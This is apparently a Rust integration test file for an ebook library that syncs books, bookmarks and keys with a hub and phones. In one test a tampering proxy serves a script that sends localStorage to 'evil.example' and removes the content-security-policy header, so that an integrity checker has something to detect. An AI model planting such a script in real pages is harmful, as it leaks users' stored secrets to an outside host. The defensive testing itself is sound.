    let token = lib.phone(&hub).await.token;
    let (_, list) = hub
        .api(Method::GET, "pub", Some(token.as_str()), None)
        .await;
    assert_eq!(list["publications"].as_array().unwrap().len(), 1);
    // Publishing a published book again keeps its copy.
    let before = lib.shelf()[0].publication;
    assert_eq!(lib.publish(book).await, "published");
    assert_eq!(lib.shelf()[0].publication, before);
}

/// A library on the hub with a bookmark on a published book and the owner's phone,
/// which has pulled everything.
async fn with_phone() -> (TestHub, Lib, common::hub::Phone, i64, String) {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let mark = lib.bookmark(book, "b2").await;
    assert_eq!(lib.publish(book).await, "published");
    let phone = lib.phone(&hub).await;
    (hub, lib, phone, book, mark)
}

/// The note and deletion time of annotation `id` in the library.
fn note(lib: &Lib, id: &str) -> (Option<String>, Option<i64>) {
    lib.userdata
        .lock()
        .query_row(
            &format!("SELECT note, deleted_at FROM annotations WHERE id = '{id}'"),
            [],
            |r| Ok((r.get(0)?, r.get(1)?)),
        )
        .unwrap()
}

#[tokio::test]
async fn the_library_and_the_owners_phone_share_the_marks() {
    let (hub, lib, phone, book, mark) = with_phone().await;
    let records = phone.pull(&hub).await;
    assert!(records.iter().any(|(k, _, _)| k == "shelf_item"));
    // The phone adds a bookmark and moves the position.
    let mut added = phone.record(&hub, "annotation", &mark).await;
    let new_id = "1b4e28ba-2fa1-11d2-883f-0016d3cca427";
    added["id"] = serde_json::json!(new_id);
    added["start_block"] = serde_json::json!(4);
    added["end_block"] = serde_json::json!(4);
    let t = shelfgauge::annotations::now();
    added["created_at"] = serde_json::json!(t);
    added["updated_at"] = serde_json::json!(t);
    phone.push(&hub, "annotation", new_id, Some(added)).await;
    let content = lib.shelf()[0].content_key.clone();
    let position_id = keys::position_id(&phone.key, &content);
    let position = serde_json::json!({
        "content_key": URL_SAFE_NO_PAD.encode(&content), "block": 5, "offset": 0,
        "suffix": "", "progress": 100, "book_title": "T", "book_authors": "A",
        "updated_at": t,
    });
    phone
        .push(&hub, "position", &position_id, Some(position))
        .await;

    lib.sync().await;
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(card.body.contains("Bookmarks (2)"), "{}", card.body);
    assert!(card.body.contains("read?at=b5"), "{}", card.body);
    assert_eq!(lib.outbox(), 0, "a merge is not pushed back");
    let exported = std::fs::read_dir(lib.library.annotations_dir())
        .map(|d| d.count())
        .unwrap_or(0);
    assert!(exported > 0, "the export follows the merge");
}

#[tokio::test]
async fn a_newer_edit_beats_a_deletion_and_a_newer_deletion_beats_an_edit() {
    let (hub, lib, phone, _book, mark) = with_phone().await;
    let t = shelfgauge::annotations::now();

    // The phone deletes at t, the library edits the note at t + 10: the edit wins.
    let mut deleted = phone.record(&hub, "annotation", &mark).await;
    deleted["deleted_at"] = serde_json::json!(t);
    deleted["updated_at"] = serde_json::json!(t);
    phone
        .push(&hub, "annotation", &mark, Some(deleted.clone()))
        .await;
    lib.sql(&format!(
        "UPDATE annotations SET note = 'kept', updated_at = {} WHERE id = '{mark}'",
        t + 10
    ));
    lib.sync().await;
    assert_eq!(note(&lib, &mark), (Some("kept".into()), None));
    let on_hub = phone.record(&hub, "annotation", &mark).await;
    assert_eq!(on_hub["note"], "kept");
    assert_eq!(on_hub["deleted_at"], serde_json::Value::Null);

    // Now the deletion is newer: it wins.
    lib.sql(&format!(
        "UPDATE annotations SET note = 'lost', updated_at = {} WHERE id = '{mark}'",
        t + 20
    ));
    lib.sync().await;
    let mut deleted = phone.record(&hub, "annotation", &mark).await;
    deleted["deleted_at"] = serde_json::json!(t + 30);
    deleted["updated_at"] = serde_json::json!(t + 30);
    phone.push(&hub, "annotation", &mark, Some(deleted)).await;
    lib.sync().await;
    assert_eq!(note(&lib, &mark).1, Some(t + 30));
    let reason: String = lib.value(&format!(
        "SELECT deleted_reason FROM annotations WHERE id = '{mark}'"
    ));
    assert_eq!(reason, "user");
    assert_eq!(lib.outbox(), 0);
}

#[tokio::test]
async fn edits_at_the_same_second_end_the_same_everywhere() {
    let (hub, lib, phone, _book, mark) = with_phone().await;
    let t = shelfgauge::annotations::now() + 5;
    lib.sql(&format!(
        "UPDATE annotations SET note = 'from home', updated_at = {t} WHERE id = '{mark}'"
    ));
    lib.sync().await;
    // The phone saved its edit in the same second, after the library's reached the hub.
    let mut edited = phone.record(&hub, "annotation", &mark).await;
    assert_eq!(edited["note"], "from home");
    edited["note"] = serde_json::json!("from the phone");
    phone.push(&hub, "annotation", &mark, Some(edited)).await;
    lib.sync().await;
    // The bytewise larger plaintext wins: "from the phone" > "from home".
    assert_eq!(note(&lib, &mark).0.as_deref(), Some("from the phone"));
    assert_eq!(
        phone.record(&hub, "annotation", &mark).await["note"],
        "from the phone",
        "the library did not push its losing edit over it"
    );
}

#[tokio::test]
async fn a_shelf_item_deleted_on_the_phone_takes_the_book_off_the_shelf() {
    let (hub, lib, phone, book, mark) = with_phone().await;
    let content = lib.shelf()[0].content_key.clone();
    let id = keys::shelf_id(&phone.key, &content);
    phone.push(&hub, "shelf_item", &id, None).await;
    lib.sync().await;
    assert!(lib.shelf().is_empty());
    let kept: i64 = lib.value(&format!(
        "SELECT count(*) FROM annotations WHERE id = '{mark}' AND deleted_at IS NULL"
    ));
    assert_eq!(kept, 1, "local marks stay");
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(card.body.contains("Read on phone"), "{}", card.body);
}

#[tokio::test]
async fn records_of_a_book_this_library_lacks_are_kept_for_later() {
    let hub = TestHub::start().await;
    let lib = Lib::with_books(&hub.url, "Laptop", &[]);
    lib.create_library(&hub.invite()).await;
    let phone = lib.phone(&hub).await;
    // The phone has a book from elsewhere on the shelf, with a mark.
    let content = vec![9u8; 16];
    let item = serde_json::json!({
        "publication": null, "book_key": null,
        "content_key": URL_SAFE_NO_PAD.encode(&content), "kind": "file",
        "instance": "Elsewhere", "title": "Far book", "authors": "A",
        "updated_at": 1_800_000_000, "format_version": 2,
    });
    let shelf_id = keys::shelf_id(&phone.key, &content);
    phone.push(&hub, "shelf_item", &shelf_id, Some(item)).await;
    let mark = "0f8fad5b-d9cb-469f-a165-70867728950e";
    let annotation = serde_json::json!({
        "id": mark, "content_key": URL_SAFE_NO_PAD.encode(&content),
        "start_block": 2, "start_offset": 0, "end_block": 2, "end_offset": 0, "text": "",
        "prefix": "", "suffix": "s", "section_title": null, "note": null,
        "book_title": "Far book", "book_authors": "A", "created_at": 1, "updated_at": 5,
        "deleted_at": null,
    });
    phone.push(&hub, "annotation", mark, Some(annotation)).await;
    lib.sync().await;
    assert_eq!(
        lib.shelf().len(),
        1,
        "the shelf lists the book from Elsewhere"
    );
    let orphan: i64 = lib.value(&format!(
        "SELECT book_id FROM annotations WHERE id = '{mark}' AND deleted_at IS NULL"
    ));
    assert_eq!(orphan, 0, "no book here yet");
    assert_eq!(lib.outbox(), 0);

    // A scan's cleanup keeps them while the book is on the shelf, even with no
    // retention (regression: they were marked removed and purged).
    let exporter = shelfgauge::annotations::export::Exporter::new(
        lib.library.annotations_dir(),
        "http://127.0.0.1:8742/",
    );
    shelfgauge::annotations::attach::cleanup_library(&lib.library, &lib.userdata, &exporter, 0)
        .unwrap();
    let kept: i64 = lib.value(&format!(
        "SELECT count(*) FROM annotations WHERE id = '{mark}' AND deleted_at IS NULL"
    ));
    assert_eq!(kept, 1);
}

#[tokio::test]
async fn marks_at_places_the_book_does_not_have_do_not_break_its_pages() {
    // A buggy device could push them; the hub cannot forge them (AEAD).
    let (hub, lib, phone, book, mark) = with_phone().await;
    let t = shelfgauge::annotations::now() + 5;
    let base = phone.record(&hub, "annotation", &mark).await;
    for (id, start, start_offset, end_offset) in [
        ("far-away-0000", 99_999, 0, 4),
        ("backwards-0000", 2, 10, 3),
    ] {
        let mut odd = base.clone();
        odd["id"] = serde_json::json!(id);
        odd["start_block"] = serde_json::json!(start);
        odd["end_block"] = serde_json::json!(start);
        odd["start_offset"] = serde_json::json!(start_offset);
        odd["end_offset"] = serde_json::json!(end_offset);
        odd["created_at"] = serde_json::json!(t);
        odd["updated_at"] = serde_json::json!(t);
        phone.push(&hub, "annotation", id, Some(odd)).await;
    }
    lib.sync().await;
    let merged: i64 = lib
        .value("SELECT count(*) FROM annotations WHERE id IN ('far-away-0000', 'backwards-0000')");
    assert_eq!(merged, 2);
    for uri in [
        format!("/book/{book}"),
        format!("/book/{book}/annotations"),
        format!("/book/{book}/read"),
        format!("/book/{book}/read?part=2"),
    ] {
        let reply = lib.get(&uri).await;
        assert_eq!(reply.status, StatusCode::OK, "{uri}: {}", reply.body);
    }
}

#[tokio::test]
async fn a_member_and_the_owner_sync_separate_accounts() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let owner_mark = lib.bookmark(book, "b2").await;
    assert_eq!(lib.publish(book).await, "published");
    let (anna, secret, one_time) = lib.invite_someone(&hub, "Anna").await;
    let member = hub.redeem(&secret, &one_time, "anna").await;
    let member_key = AccountKey::new(
        URL_SAFE_NO_PAD
            .decode(&member.payload.account_key)
            .unwrap()
            .try_into()
            .unwrap(),
    );
    // Anna's device bookmarks the book in her account.
    let mut mark = common::hub::pull_records(
        &hub,
        &lib.phone(&hub).await.token,
        &lib.account().unwrap().key,
    )
    .await
    .into_iter()
    .find(|(k, id, _)| k == "annotation" && *id == owner_mark)
    .and_then(|(_, _, p)| p)
    .unwrap();
    let anna_mark = "2c1e28ba-2fa1-11d2-883f-0016d3cca427";
    mark["id"] = serde_json::json!(anna_mark);
    common::hub::push_record(
        &hub,
        &member.token,
        &member_key,
        "annotation",
        anna_mark,
        Some(mark),
    )
    .await;
    lib.sync().await;
    let profile_of = |id: &str| -> i64 {
        lib.value(&format!(
            "SELECT profile_id FROM annotations WHERE id = '{id}'"
        ))
    };
    assert_eq!(profile_of(&owner_mark), 1);
    assert_eq!(profile_of(anna_mark), anna);
    // Each account on the hub holds only its own records.
    let anna_records = common::hub::pull_records(&hub, &member.token, &member_key).await;
    assert!(anna_records.iter().any(|(_, id, _)| id == anna_mark));
    assert!(!anna_records.iter().any(|(_, id, _)| *id == owner_mark));
}

#[tokio::test]
async fn a_sync_notices_expired_publications_and_reports_errors() {
    use shelfgauge::hub_client::store::ShelfState;

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    // The hub drops the copy (as after `publication_expiry_days`).
    let token = lib.hub_library().token.as_str().to_owned();
    let id = lib.shelf()[0].publication.unwrap().to_string();
    hub.api(
        Method::DELETE,
        &format!("pub/{id}"),
        Some(token.as_str()),
        None,
    )
    .await;
    lib.sync().await;
    assert_eq!(lib.shelf()[0].state, ShelfState::Expired);
    let account = lib.account().unwrap();
    assert!(account.synced_at.is_some());
    assert!(account.last_seq > 0);

    hub.stop().await;
    let reply = lib.post("/profile/hub", &[("action", "sync")]).await;
    assert_eq!(reply.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(reply.body.contains("cannot be reached"));
    let account = lib.account().unwrap();
    assert!(account.sync_error.unwrap().contains("cannot be reached"));
}

#[tokio::test]
async fn the_worker_syncs_at_start() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    assert!(lib.account().unwrap().synced_at.is_none());

    let worker = shelfgauge::web::hub_sync::start(lib.state.clone());
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    while lib.account().unwrap().synced_at.is_none() {
        assert!(
            std::time::Instant::now() < deadline,
            "the worker did not sync"
        );
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    worker.abort();
}

#[tokio::test]
async fn the_hub_reading_view_has_what_reader_js_needs() {
    // templates/hub/read.html repeats read.html's markup for reader.js, which runs on
    // both unchanged: every element it looks for must be in both pages.
    let hub = TestHub::start().await;
    let lib = Lib::new(&hub.url, "Home");
    let instance = lib.get("/book/1/read").await;
    assert_eq!(instance.status, StatusCode::OK);
    let response = tower::ServiceExt::oneshot(
        hub.app.clone(),
        axum::http::Request::get(format!("/r/{}", "ab".repeat(16)))
            .header(header::HOST, hub.url.trim_start_matches("http://"))
            .body(axum::body::Body::empty())
            .unwrap(),
    )
    .await
    .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let hub_page = String::from_utf8(bytes.to_vec()).unwrap();
    for needle in [
        r#"<article class="reader""#,
        r#"<header class="reader-head">"#,
        r#"class="book-link""#,
        r#"<a class="back-to-text" lang="en" hidden>"#,
        r#"<a class="back-to-text" lang="en" tabindex="-1" hidden>"#,
        r#"<nav class="reader-nav" aria-label="Parts">"#,
        r#"<div class="text">"#,
        r#"<div class="running-head" aria-hidden="true">"#,
        r#"<span class="running-title">"#,
        r#"<div class="status-line" aria-hidden="true">"#,
        r#"<div class="track""#,
        r#"<span class="status-progress">"#,
        r#"<div class="toc-book">"#,
        r#"<span class="tab-pager" hidden lang="en">"#,
        r#"<nav class="reader-tabs" aria-label="Sidebar" lang="en">"#,
        r#"data-tab="toc""#,
        r#"id="tab-toc""#,
        r#"id="sidebar""#,
        r#"class="sidebar-resizer""#,
        r#"class="icon-button sidebar-toggle""#,
        r#"class="icon-button focus-button""#,
        r#"class="icon-button settings-button" popovertarget="reader-settings""#,
        r#"<div id="reader-settings" class="reader-settings" popover"#,
        r#"<select class="theme-select""#,
        r#"<symbol id="i-focus""#,
        r#"class="icon-button bookmark-button""#,
        r#"<form class="search find-form""#,
        r#"class="find-input""#,
        r#"<div class="annotation-lists">"#,
        r#"id="tab-bookmarks""#,
        r#"id="tab-marks""#,
        r#"<section class="tab-panel" id="tab-find""#,
        r##"<a href="#tab-find" data-tab="find" class="find-tab""##,
        "data-annotations=",
        "data-position=",
        "data-max-text=",
        "data-max-note=",
        "/assets/theme.js",
        "/assets/app.js",
        "/assets/reader.css",
    ] {
        assert!(
            instance.body.contains(needle),
            "the library's page: {needle}"
        );
        assert!(hub_page.contains(needle), "the hub's page: {needle}");
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hub_check_finds_a_reader_app_that_differs() {
    use shelfgauge::hub::check::check;
    use shelfgauge::hub_client::HubUrl;

    let hub = TestHub::start_with(|c| c.server.base_path = "/sg".into()).await;
    let url = HubUrl::parse(&format!("{}/sg", hub.url)).unwrap();
    let report = tokio::task::spawn_blocking(move || check(&url))
        .await
        .unwrap()
        .unwrap();
    assert!(report.matches(), "{report:?}");
    assert!(report.same_version());
    assert!(report.checked > 10, "{report:?}");

    // The same hub behind a proxy that changes the app and drops the worker.
    async fn tamper(
        req: axum::extract::Request,
        next: axum::middleware::Next,
    ) -> axum::response::Response {
        use axum::response::IntoResponse;
        match req.uri().path() {
            "/assets/hub.js" => "fetch('https://evil.example/' + localStorage)".into_response(),
            "/sw.js" => StatusCode::NOT_FOUND.into_response(),
            _ => {
                let mut response = next.run(req).await;
                response.headers_mut().remove("content-security-policy");
                response
            }
        }
    }
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let mut config = shelfgauge::hub::config::HubConfig::default();
    config.server.port = port;
    let state = shelfgauge::hub::HubState::new(
        shelfgauge::hub::Hub::with_config(hub._dir.path(), config).unwrap(),
    );
    let app = shelfgauge::hub::router(state).layer(axum::middleware::from_fn(tamper));
    tokio::spawn(async move {
        axum::serve(
            listener,
            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
        )
        .await
    });
    let url = HubUrl::parse(&format!("http://localhost:{port}")).unwrap();
    let report = tokio::task::spawn_blocking(move || check(&url))
        .await
        .unwrap()
        .unwrap();
    assert!(!report.matches());
    assert_eq!(report.differing, ["/assets/hub.js"]);
    assert_eq!(report.missing, [("/sw.js".to_owned(), 404)]);
    assert!(!report.csp_matches);
}

#[tokio::test]
async fn the_owner_pairs_a_new_phone_with_the_book_open() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let id = lib.shelf()[0].publication.unwrap().to_string();
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(
        card.body.contains("Pair a new phone with this book"),
        "{}",
        card.body
    );
    let page = lib
        .post(&format!("/book/{book}/hub"), &[("action", "pair")])
        .await;
    assert_eq!(page.status, StatusCode::OK, "{}", page.body);
    assert_eq!(page.headers[header::CACHE_CONTROL], "no-store");
    let prefix = format!("{}/r/{id}#pair=", hub.url);
    let start = page
        .body
        .find(&prefix)
        .expect("the book link with the pairing")
        + prefix.len();
    let fragment: String = page.body[start..]
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        .collect();
    let (secret, key) = fragment.split_once('.').unwrap();
    assert_eq!(key, lib.account().unwrap().key.to_text());
    let (status, _) = hub
        .api(
            Method::POST,
            "pair",
            None,
            Some(serde_json::json!({ "secret": secret })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
}

#[tokio::test]
async fn a_reader_profile_sends_no_book_to_the_hub() {
    use shelfgauge::profiles::session::{self, Level};
    use shelfgauge::profiles::{Role, store as profiles};

    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let reader = {
        let conn = lib.userdata.lock();
        let anna = profiles::create(&conn, "Anna", 1, Role::Reader, 0)
            .unwrap()
            .id;
        session::create(&conn, anna, Level::Local, false, 0).unwrap()
    };
    lib.act_as(Some(reader.as_str()));
    let card = lib.get(&format!("/book/{book}")).await;
    assert_eq!(card.status, StatusCode::OK);
    assert!(!card.body.contains("Read on phone"), "{}", card.body);
    let refused = lib
        .post(&format!("/book/{book}/hub"), &[("action", "publish")])
        .await;
    assert_eq!(refused.status, StatusCode::FORBIDDEN);
    assert!(lib.shelf().is_empty());
}

#[tokio::test]
async fn the_card_asks_for_the_upload_progress() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    let card = lib.get(&format!("/book/{book}")).await;
    assert!(card.body.contains("data-upload-progress"), "{}", card.body);
    let idle = lib.get(&format!("/book/{book}/hub")).await;
    assert_eq!(idle.status, StatusCode::OK);
    assert_eq!(idle.headers[header::CACHE_CONTROL], "no-store");
    let state: serde_json::Value = serde_json::from_str(&idle.body).unwrap();
    assert_eq!(
        state,
        serde_json::json!({ "uploading": false, "done": 0, "total": 0 })
    );
    // While a second request publishes the same book, the first one's progress shows.
    let (published, during) = tokio::join!(lib.publish(book), async {
        lib.get(&format!("/book/{book}/hub")).await
    });
    assert_eq!(published, "published");
    let during: serde_json::Value = serde_json::from_str(&during.body).unwrap();
    assert!(
        during["done"].as_u64() <= during["total"].as_u64(),
        "{during}"
    );
}

#[tokio::test]
async fn the_owners_phone_gets_the_library_key_and_opens_a_book_with_it() {
    let hub = TestHub::start().await;
    let lib = Lib::registered(&hub).await;
    let book = lib.book("book.txt");
    assert_eq!(lib.publish(book).await, "published");
    let id = lib.shelf()[0].publication.unwrap().to_string();
    let phone = lib.phone(&hub).await;
    lib.sync().await;
    let record = phone.record(&hub, "library_key", "k1").await;
    assert_eq!(record["key_id"], 1);
    let key = AccountKey::new(
        URL_SAFE_NO_PAD
            .decode(record["key"].as_str().unwrap())
            .unwrap()
            .try_into()
            .unwrap(),
    );
    let (_, manifest) = hub.blob(&phone.token, &id, "manifest").await;
    let (key_id, _) = book_key_of(&manifest, &id, &[(1, key)]);
    assert_eq!(key_id, 1);
}
